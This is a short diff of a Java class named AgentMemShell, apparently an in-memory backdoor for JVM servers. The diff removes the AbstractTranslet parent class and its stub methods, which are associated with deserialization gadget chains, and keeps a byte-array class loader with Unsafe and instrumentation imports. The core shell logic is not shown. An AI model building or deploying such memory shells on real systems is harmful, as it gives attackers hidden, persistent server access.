@@ -1,8 +1,3 @@
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import sun.misc.Unsafe;
 import java.io.IOException;
 import java.lang.instrument.ClassDefinition;
@@ -11,7 +6,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.Base64;
 
-public class AgentMemShell extends ClassLoader,AbstractTranslet {
+public class AgentMemShell extends ClassLoader {
     public Class get(byte[] b) {
         return super.defineClass(b, 0, b.length);
     }
@@ -122,14 +117,5 @@ public class AgentMemShell extends ClassLoader,AbstractTranslet {
             }
         }
         return bytes;
-    }
-    @Override
-    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
-
-    }
-
-    @Override
-    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
-
     }
 }
